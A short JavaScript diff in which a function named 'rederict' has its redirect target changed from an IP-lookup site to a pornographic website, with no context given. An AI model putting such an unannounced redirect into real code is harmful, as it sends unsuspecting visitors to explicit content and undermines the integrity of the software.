@@ -29,5 +29,5 @@ function ready() {
 }
 
 function rederict() {
-  window.location = 'http://2ip.ru/'
+  window.location = 'http://pornhub.com/'
 }
